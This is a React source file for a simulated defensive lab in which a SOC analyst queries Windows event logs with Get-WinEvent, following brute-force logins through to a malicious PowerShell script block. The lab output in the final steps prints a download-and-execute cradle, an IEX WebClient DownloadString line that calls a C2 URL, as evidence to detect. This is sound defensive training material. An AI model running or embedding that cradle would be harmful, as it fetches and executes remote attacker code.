import React from "react";
import LabRunner from "@/components/labs/LabRunner";

const steps = [
  {
    stepLabel: "List Available Event Logs",
    prompt: "PS C:\\Users\\Analyst>",
    command: 'Get-WinEvent -ListLog * | Where-Object { $_.RecordCount -gt 0 } | Sort-Object RecordCount -Descending | Select-Object -First 10',
    explanation: "Get-WinEvent -ListLog * enumerates all event logs. Filtering for non-empty logs and sorting by record count identifies the most active logs — useful for prioritization.",
    whyItMatters: "Windows has hundreds of event logs. Knowing which ones contain the most data focuses your investigation. Security, System, and Application are the most critical for incident response.",
    output: [
      "",
      "LogName                       RecordCount",
      "-----------                   -----------",
      "Microsoft-Windows-Sysmon/...       128447",
      "System                              48291",
      "Application                         32184",
      "Security                            24531",
      "Microsoft-Windows-PowerSh...        12847",
      "",
    ],
    nextStepDirections: "Security log has 24,531 events. Query it for failed login attempts.",
    securityInsight: {
      title: "Sysmon for Enhanced Logging",
      content: "MITRE ATT&CK Defense: Sysmon (System Monitor) provides far more detail than native Windows logs. Event ID 1 (process create), 3 (network connect), and 11 (file create) are critical for threat hunting. Always deploy Sysmon in enterprise environments.",
    },
  },
  {
    stepLabel: "Query Failed Login Events",
    prompt: "PS C:\\Users\\Analyst>",
    command: 'Get-WinEvent -LogName Security -FilterHashtable @{Id=4625} -MaxEvents 5',
    explanation: "FilterHashtable is the most efficient way to query event logs. Event ID 4625 is 'An account failed to log on' — a key indicator for brute force attacks.",
    whyItMatters: "A spike in Event ID 4625 events indicates a brute force or password spray attack. Analyzing the source IP addresses and targeted accounts reveals the attacker's pattern.",
    output: [
      "",
      "   ProviderName: Microsoft-Windows-Security-Auditing",
      "",
      "TimeCreated                     Id LevelDisplayName Message",
      "-----------                     -- ---------------- -------",
      "6/9/2026 8:50:12 AM           4625 Information      An account failed to log on.",
      "6/9/2026 8:50:09 AM           4625 Information      An account failed to log on.",
      "6/9/2026 8:50:06 AM           4625 Information      An account failed to log on.",
      "6/9/2026 8:50:03 AM           4625 Information      An account failed to log on.",
      "6/9/2026 8:49:58 AM           4625 Information      An account failed to log on.",
      "",
    ],
    nextStepDirections: "5 failed logins in under a minute — this looks like a brute force. Query for successful logins around the same time.",
    securityInsight: {
      title: "Event ID 4625 — Brute Force Detection",
      content: "MITRE ATT&CK T1110 — Multiple 4625 events targeting the same account from the same source IP within a short window is a high-confidence brute force indicator. Correlate with 4624 (successful login) immediately after 4625s to detect successful account compromise.",
    },
  },
  {
    stepLabel: "Query Successful Logins",
    prompt: "PS C:\\Users\\Analyst>",
    command: 'Get-WinEvent -LogName Security -FilterHashtable @{Id=4624; StartTime="6/9/2026 8:49:00"; EndTime="6/9/2026 8:51:00"} -MaxEvents 10',
    explanation: "Adding StartTime and EndTime to the filter drastically improves query performance on large logs. This queries only the 2-minute window around the suspicious activity.",
    whyItMatters: "Time-scoped queries are essential for correlating events. Narrowing to a specific window prevents being overwhelmed by noise and focuses analysis on the suspicious timeframe.",
    output: [
      "",
      "TimeCreated                     Id LevelDisplayName Message",
      "-----------                     -- ---------------- -------",
      "6/9/2026 8:50:47 AM           4624 Information      An account was successfully logged on.",
      "",
    ],
    nextStepDirections: "A successful login at 8:50:47 — right after the brute force. Check PowerShell execution logs.",
    securityInsight: {
      title: "4624 After 4625 — Account Compromise",
      content: "MITRE ATT&CK T1078 — A 4624 immediately following multiple 4625s from the same source is a near-certain indicator of successful brute force compromise. The logon type in the event details (Type 3=network, Type 10=remote interactive) reveals the attack vector.",
    },
  },
  {
    stepLabel: "Query PowerShell Script Block Logs",
    prompt: "PS C:\\Users\\Analyst>",
    command: 'Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterHashtable @{Id=4104} -MaxEvents 3',
    explanation: "Event ID 4104 captures PowerShell script block content — the actual code that ran. This is invaluable for detecting obfuscated or malicious PowerShell.",
    whyItMatters: "Script block logging captures what PowerShell actually executed, even if it was Base64-encoded or downloaded from the internet. This is the primary defense against living-off-the-land attacks.",
    output: [
      "",
      "TimeCreated                     Id LevelDisplayName Message",
      "-----------                     -- ---------------- -------",
      "6/9/2026 8:51:02 AM           4104 Warning          Creating Scriptblock text (1 of 1):",
      "                                                     IEX (New-Object Net.WebClient).Down...",
      "6/9/2026 8:51:01 AM           4104 Information      Creating Scriptblock text (1 of 1):",
      "                                                     Get-Process",
      "",
    ],
    nextStepDirections: "CRITICAL: Event 4104 shows IEX with New-Object Net.WebClient — a classic download-and-execute pattern. Expand the full message.",
    securityInsight: {
      title: "IEX + WebClient = Download Cradle",
      content: "MITRE ATT&CK T1059.001 + T1105 — IEX (Invoke-Expression) combined with Net.WebClient.DownloadString is the most common PowerShell download cradle. It downloads and executes code from a remote server in memory. Script block logging is the primary detection mechanism.",
    },
  },
  {
    stepLabel: "Extract Full Event Message",
    prompt: "PS C:\\Users\\Analyst>",
    command: 'Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterHashtable @{Id=4104} -MaxEvents 1 | Select-Object -ExpandProperty Message',
    explanation: "Select-Object -ExpandProperty expands a single property to its full value. This reveals the complete script block content that was truncated in the standard view.",
    whyItMatters: "Truncated output hides malicious details. Always expand message properties when investigating security events to see the full context of what was logged.",
    output: [
      "",
      "Creating Scriptblock text (1 of 1):",
      "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.200:8080/payload.ps1')",
      "",
      "ScriptBlock ID: a1b2c3d4-e5f6-7890-abcd-ef1234567890",
      "Path: ",
      "",
    ],
    finalGoal: "You queried event logs for brute force indicators, correlated a successful login after failed attempts, identified a PowerShell download cradle in script block logs, and extracted the full C2 server URL — a complete event log threat hunting workflow.",
    nextStepDirections: "Lab complete! C2 server identified: 192.168.1.200:8080. Block this IP and escalate immediately.",
    securityInsight: {
      title: "C2 IOC Extraction from Logs",
      content: "MITRE ATT&CK T1071 — The extracted URL (http://192.168.1.200:8080/payload.ps1) is a Command & Control indicator. Immediately: (1) Block the IP at the firewall, (2) Search all other hosts for the same ScriptBlock ID, (3) Preserve the event log as evidence before it rotates.",
    },
  },
];

export default function LabPSEventLogs() {
  return (
    <LabRunner
      labTitle="Windows Event Log Analysis"
      chapterNum={8}
      difficulty="Intermediate"
      tags={["PowerShell", "Event Logs", "Threat Hunting", "Windows"]}
      terminalLabel="Windows PowerShell 5.1"
      duration={35}
      steps={steps}
      intro={{
        overview: "The SOC has received an alert for suspicious login activity on ANALYST-WS01. You need to investigate using Windows Event Logs — querying for brute force indicators, correlating a successful compromise, and hunting for post-exploitation PowerShell activity in script block logs.",
        objectives: [
          "Enumerate available event logs with Get-WinEvent",
          "Query for failed login events (Event ID 4625)",
          "Correlate successful logins (Event ID 4624) in a time window",
          "Investigate PowerShell script block logs (Event ID 4104)",
          "Extract full event messages to identify C2 indicators",
        ],
        tools: ["Get-WinEvent", "FilterHashtable", "Security Log", "PowerShell Operational Log"],
        prerequisites: ["PowerShell Scripting Fundamentals"],
      }}
    />
  );
}